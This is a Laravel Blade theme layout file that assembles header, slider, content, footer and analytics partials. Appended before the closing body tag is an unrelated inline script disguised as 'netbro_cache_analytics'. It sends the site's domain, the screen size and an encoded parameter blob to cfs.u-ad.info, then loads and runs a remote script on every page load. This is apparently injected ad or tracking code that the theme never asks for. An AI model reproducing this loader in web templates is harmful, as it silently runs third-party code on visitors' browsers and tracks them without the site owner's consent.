<!DOCTYPE html>
<html>
    <head>
        {{ Theme::partial('seostuff') }}    
        {{ Theme::partial('defaultcss') }}  
        {{ Theme::asset()->styles() }}  
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->        
    </head>
    <body class="wrapper">
        {{ Theme::partial('header') }}  
        <section class="content data-content">
            {{ Theme::partial('slider') }}  
            {{ Theme::place('content') }}   
            {{-- Theme::partial('subscribe') --}}   
        </section>
        {{ Theme::partial('footer') }}  
        {{ Theme::partial('defaultjs') }}   
        {{-- Theme::asset()->scripts() --}} 
        {{ Theme::asset()->container('footer')->scripts() }}    
        {{ Theme::partial('analytic') }}    
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnP%2bzvD%2fZXKIlchx5NG7F8XOuy8ompoth4O0%2bPlWgp0pM%2bzJLjvxrbjEURQFi8lGz463Y1vUW6NW6ZuIN0QcJMuLxVAibRhizGyFGwqytA%2bbPE4%2blBfdB5mkBFpCYYndTAQC686xZj3t2xtAAA86LyFNjieSWZLasqJ%2bpKV1k%2fducpCA4MnpeGmmBH%2bLPKXoslJ5Sn0RV%2fo%2bnr1rbhHmMKSuuDhIYtnxlj1OdZo0LNc2Snu0VluZy3lm9KrejpRG7XHMwtu77o3LE06QJD5NjqFINOJSN2juyIU38%2bo5cGA7BkO5Ie2F4tDpR8JB2tdkM%2fJ4zrhHFx0K5tKOQH%2f9jZTMUYAXwqD0dify1zfijdPLNLXazro3jEZdC%2b18ZpmOj89z5s%2fjw%2b9ha%2fIGNo7cK4isTOhPElTp5j4GsMaToRhR%2fbLLlwhpcFmwB4frpx%2bo%2fiNCfwPd6BP6OUpBliR4cAY6CHppvZfbDJtiX5caGvS0W3D%2bVQBVApJaQd7n4M211PMRwRbmvus%2fKpj%2bTRocaENjULRuHHXp8bWefFdalgp%2fsvYPObdxsPZ9WuYVnGfZJt" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>